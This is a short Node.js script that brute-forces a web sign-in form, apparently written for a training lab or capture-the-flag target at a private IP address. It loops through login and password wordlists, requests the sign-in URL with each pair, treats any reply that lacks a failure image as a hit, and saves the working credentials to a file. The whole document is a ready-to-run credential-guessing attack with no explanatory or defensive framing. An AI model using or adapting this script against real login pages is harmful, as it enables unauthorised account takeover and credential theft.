const fs = require('fs');
const loginsFile = 'logins';
const passwordsFile = 'passwords';
const resultFile = 'result';
const ip = '10.171.57.148';

const getUrl = (ip, login, password) =>
  `http://${ip}/?page=signin&username=${login}&password=${password}&Login=Login#`;

const testSuccess = async url => {
  try {
    console.log(`try ${url}`);
    const response = await fetch(url);
    const text = await response.text();
    return !text.includes('WrongAnswer.gif');
  } catch (error) {
    console.error('error fetch (testSuccess): ', error);
  }
};

async function bruteForce(logins, passwords) {
  for (let login = 0; login < logins.length; login++) {
    for (let pass = 0; pass < passwords.length; pass++) {
      const isSuccess = await testSuccess(
        getUrl(ip, logins[login], passwords[pass]),
      );
      if (isSuccess) {
        const line =
          `{login: ${logins[login]}, password: ${passwords[pass]} }` + '\n';
        fs.appendFileSync(resultFile, line, { encoding: 'utf8' });
      }
    }
  }
}

async function main() {
  const loginsFileRead = fs.readFileSync(loginsFile, { encoding: 'utf8' });
    const passwordsFileRead = fs.readFileSync(passwordsFile, {
    encoding: 'utf8',
  });
  
  const logins = loginsFileRead.split(/\r?\n/);
  const passwords = passwordsFileRead.split(/\r?\n/);

  if (!logins || !passwords) {
    console.log('error: no test data');
    return;
  }
  await bruteForce(logins, passwords);
}

main().catch(console.error);
